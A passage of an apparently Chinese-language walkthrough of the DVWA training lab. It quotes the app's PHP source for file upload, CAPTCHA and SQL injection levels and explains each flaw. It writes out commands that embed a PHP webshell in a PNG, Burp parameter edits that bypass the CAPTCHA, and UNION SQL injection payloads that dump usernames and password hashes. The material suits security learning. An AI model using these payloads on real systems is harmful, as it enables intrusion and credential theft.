<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111220057185.png" alt="image-20240111220057185"></p>
<h2 id="high">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Upload'</span> ] ) ) {
    <span class="hljs-comment">// Where are we going to be writing to?</span>
    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">"hackable/uploads/"</span>;
    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ] );

    <span class="hljs-comment">// File information</span>
    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ];
    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">'.'</span> ) + <span class="hljs-number">1</span>);
    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'size'</span> ];
    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'tmp_name'</span> ];

    <span class="hljs-comment">// Is it an image?</span>
    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpeg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"png"</span> ) &amp;&amp;
        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;
        <span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) {

        <span class="hljs-comment">// Can we move the file to the upload folder?</span>
        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) {
            <span class="hljs-comment">// No</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;
        }
        <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// Yes!</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;
        }
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Invalid file</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里是取出了文件上传时的后缀名，如果不是jpg或者jpeg或者png，则上传失败。同时还使用<code>getimagesize</code>函数检测上传的文件是否为图片，这里可以使用图片马绕过。</p>
<p>Linux下图片马的制作：</p>
<pre><code class="hljs scss"># 将 shell<span class="hljs-selector-class">.php</span> 内容追加到 pic<span class="hljs-selector-class">.png</span>
cat shell<span class="hljs-selector-class">.php</span> &gt;&gt; pic<span class="hljs-selector-class">.png</span>

# png + php 合成 png 图马
cat pic<span class="hljs-selector-class">.png</span> shell<span class="hljs-selector-class">.php</span> &gt;&gt; shell<span class="hljs-selector-class">.png</span>

# 直接 echo 追加
echo '&lt;?php <span class="hljs-built_in">phpinfo</span>();?&gt;' &gt;&gt; pic<span class="hljs-selector-class">.png</span></code></pre>
<p>Windows下图片马的制作：</p>
<pre><code class="hljs scss">copy pic<span class="hljs-selector-class">.png</span>/<span class="hljs-selector-tag">b</span>+shell<span class="hljs-selector-class">.php</span>/<span class="hljs-selector-tag">a</span> shell<span class="hljs-selector-class">.png</span></code></pre>
<p>正常制作图片马上传即可，接着利用上一关的文件包含漏洞包含png使其解析其中的PHP代码即可</p>
<h2 id="impossible">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Upload'</span> ] ) ) {
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'user_token'</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );

    <span class="hljs-comment">// File information</span>
    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ];
    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">'.'</span> ) + <span class="hljs-number">1</span>);
    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'size'</span> ];
    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'type'</span> ];
    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'tmp_name'</span> ];

    <span class="hljs-comment">// Where are we going to be writing to?</span>
    <span class="hljs-variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">'hackable/uploads/'</span>;
    <span class="hljs-comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span>
    <span class="hljs-variable">$target_file</span>   =  <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$uploaded_ext</span>;
    <span class="hljs-variable">$temp_file</span>     = ( ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">'upload_tmp_dir'</span> ) == <span class="hljs-string">''</span> ) ? ( <span class="hljs-title function_ invoke__">sys_get_temp_dir</span>() ) : ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">'upload_tmp_dir'</span> ) ) );
    <span class="hljs-variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$uploaded_ext</span>;

    <span class="hljs-comment">// Is it an image?</span>
    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">'jpg'</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">'jpeg'</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">'png'</span> ) &amp;&amp;
        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;
        ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">'image/jpeg'</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">'image/png'</span> ) &amp;&amp;
        <span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) {

        <span class="hljs-comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span>
        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">'image/jpeg'</span> ) {
            <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>( <span class="hljs-variable">$uploaded_tmp</span> );
            <span class="hljs-title function_ invoke__">imagejpeg</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">100</span>);
        }
        <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>( <span class="hljs-variable">$uploaded_tmp</span> );
            <span class="hljs-title function_ invoke__">imagepng</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">9</span>);
        }
        <span class="hljs-title function_ invoke__">imagedestroy</span>( <span class="hljs-variable">$img</span> );

        <span class="hljs-comment">// Can we move the file to the web root from the temp folder?</span>
        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">rename</span>( <span class="hljs-variable">$temp_file</span>, ( <span class="hljs-title function_ invoke__">getcwd</span>() . DIRECTORY_SEPARATOR . <span class="hljs-variable">$target_path</span> . <span class="hljs-variable">$target_file</span> ) ) ) {
            <span class="hljs-comment">// Yes!</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;a href='<span class="hljs-subst">{$target_path}</span><span class="hljs-subst">{$target_file}</span>'&gt;<span class="hljs-subst">{$target_file}</span>&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>;
        }
        <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// No</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;
        }

        <span class="hljs-comment">// Delete any temp files</span>
        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$temp_file</span> ) )
            <span class="hljs-title function_ invoke__">unlink</span>( <span class="hljs-variable">$temp_file</span> );
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Invalid file</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;
    }
}
<span class="hljs-comment">// Generate Anti-CSRF token</span>
<span class="hljs-title function_ invoke__">generateSessionToken</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>使用了时间戳的md5值做文件名，然后添加文件后缀，接着判断后缀名以及content-type类型，和检测是否为图片，同时使用<code>imagecreatefrompng</code>等类似函数，删除掉了元数据，创建新图像。意味着图片马也无法绕过了</p>
<h1 id="0x06-insecure-captcha">0x06 Insecure CAPTCHA</h1>
<h2 id="low">Low</h2>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Change'</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'step'</span> ] == <span class="hljs-string">'1'</span> ) ) {
    <span class="hljs-comment">// Hide the CAPTCHA form</span>
    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;

    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_new'</span> ];
    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_conf'</span> ];

    <span class="hljs-comment">// Check CAPTCHA from 3rd party</span>
    <span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">recaptcha_check_answer</span>(
        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'recaptcha_private_key'</span>],
        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'g-recaptcha-response'</span>]
    );

    <span class="hljs-comment">// Did the CAPTCHA fail?</span>
    <span class="hljs-keyword">if</span>( !<span class="hljs-variable">$resp</span> ) {
        <span class="hljs-comment">// What happens when the CAPTCHA was entered incorrectly</span>
        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;
        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// CAPTCHA was correct. Do both new passwords match?</span>
        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {
            <span class="hljs-comment">// Show next stage for the user</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"</span>
<span class="hljs-string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span>
<span class="hljs-string">                &lt;form action=\"#\" method=\"POST\"&gt;</span>
<span class="hljs-string">                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span>
<span class="hljs-string">                    &lt;input type=\"hidden\" name=\"password_new\" value=\"<span class="hljs-subst">{$pass_new}</span>\" /&gt;</span>
<span class="hljs-string">                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"<span class="hljs-subst">{$pass_conf}</span>\" /&gt;</span>
<span class="hljs-string">                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span>
<span class="hljs-string">                &lt;/form&gt;"</span>;
        }
        <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// Both new passwords do not match.</span>
            <span class="hljs-variable">$html</span>     .= <span class="hljs-string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;
            <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;
        }
    }
}</code></pre>
<p>前半部分代码如上，这里看到他会先去判断验证码是否正确，如果正确才会接着去判断密码修改情况。否则报错</p>
<p>关键在于第二部分代码：</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Change'</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'step'</span> ] == <span class="hljs-string">'2'</span> ) ) {
    <span class="hljs-comment">// Hide the CAPTCHA form</span>
    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;

    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_new'</span> ];
    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_conf'</span> ];

    <span class="hljs-comment">// Check to see if both password match</span>
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {
        <span class="hljs-comment">// They do!</span>
        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );

        <span class="hljs-comment">// Update database</span>
        <span class="hljs-variable">$insert</span> = <span class="hljs-string">"UPDATE `users` SET password = '<span class="hljs-subst">$pass_new</span>' WHERE user = '"</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">"';"</span>;
        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );

        <span class="hljs-comment">// Feedback for the end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Issue with the passwords matching</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;
        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;
    }

    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里在if语句的开头都对step的参数做了判断，如果是2的话，就默认为经历了step=1的验证码的验证，接着取将修改后的密码直接插入数据库更新（同时防止了SQL注入）</p>
<p>这意味着我们可以在修改密码之后，bp抓包修改step的值来绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112172843455.png" alt="image-20240112172843455"></p>
<h2 id="medium">Medium</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112173235566.png" alt="image-20240112173235566"></p>
<p>这里与上一关的不同点在于，上述图片中的表单form中添加了一个隐藏元素passed_captcha并被设置为了true，这会被用于第二步</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112173336700.png" alt="image-20240112173336700"></p>
<p>他会判断passed_captcha表单元素是否存在，也就是判断了step=1这一步是否被执行过，但我们依旧可以bp修改绕过，只需要抓包修改step为2进入第二个if判断，接着添加passed_captcha元素为true即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112173226410.png" alt="image-20240112173226410"></p>
<h2 id="high">High</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112175650521.png" alt="image-20240112175650521"></p>
<p>与前几个级别不同点在于，这一关取消了step的判断，但却在判断验证码是否正确的同时，多了如下代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'g-recaptcha-response'</span> ] == <span class="hljs-string">'hidd3n_valu3'</span>
            &amp;&amp; <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'HTTP_USER_AGENT'</span> ] == <span class="hljs-string">'reCAPTCHA'</span></code></pre>
<p>这明摆着，直接bp修改即可，如下图，添加<code>g-recaptcha-response</code>的同时，修改UA头，即可绕过，但这里我似乎还需要删除step这个参数才能成功，不知为何</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112175639711.png" alt="image-20240112175639711"></p>
<h2 id="impossible">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Change'</span> ] ) ) {
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'user_token'</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );

    <span class="hljs-comment">// Hide the CAPTCHA form</span>
    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;

    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_new'</span> ];
    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_new</span> );
    <span class="hljs-variable">$pass_new</span>  = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );

    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_conf'</span> ];
    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_conf</span> );
    <span class="hljs-variable">$pass_conf</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_conf</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_conf</span> );

    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_current'</span> ];
    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_curr</span> );
    <span class="hljs-variable">$pass_curr</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_curr</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_curr</span> );

    <span class="hljs-comment">// Check CAPTCHA from 3rd party</span>
    <span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">recaptcha_check_answer</span>(
        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'recaptcha_private_key'</span> ],
        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'g-recaptcha-response'</span>]
    );</code></pre>
<p>这一关添加了token反正了CSRF，同时添加了要求用户填写当前密码的功能，也防止了SQL注入，接着判断验证码是否匹配。</p>
<p>很明显这里修改了前几个级别犯的错误，我们已经没有办法通过增删参数来绕过了。</p>
<h1 id="0x07-sql-injection">0x07 SQL Injection</h1>
<h2 id="low">Low</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180252324.png" alt="image-20240112180252324"></p>
<p>如上图所示，这里显示判断数据库类型（并不需要在意），随后对用户输入的id参数进行拼接SQL语句查询，然后直接连接数据库查询对应id的数据，并未做出任何过滤，我们只需要正确闭合SQL语句即可</p>
<pre><code class="hljs scss">?id=<span class="hljs-number">1</span>' union select <span class="hljs-built_in">version</span>(), <span class="hljs-built_in">database</span>()--+&amp;Submit=Submit#</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180512510.png" alt="image-20240112180512510"></p>
<p>由于代码本身就支持展示多行数据，也就没必要搞什么分隔符之类的来明晰数据了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112181713231.png" alt="image-20240112181713231"></p>
<pre><code class="hljs scss">?id=<span class="hljs-number">1</span>' union select user, password from users--+</code></pre>
<h2 id="medium">Medium</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180632235.png" alt="image-20240112180632235"></p>
<p>修改的点在于采用<code>mysqli_real_escape_string</code>函数来对特殊字符进行转义，其中特殊字符如下图所展示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180624680.png" alt="image-20240112180624680"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180750061.png" alt="image-20240112180750061"></p>
<p>但这里幸运的是，改为了数字型查询。但这里有限制的点在于，当我们查到表名为users，接来下回去查询users中的列名，那无疑是需要单引号或者双引号包围的，但我们可以通过16进制绕过，因为SQL数据库对16进制数据会自动转换为10进制识别</p>
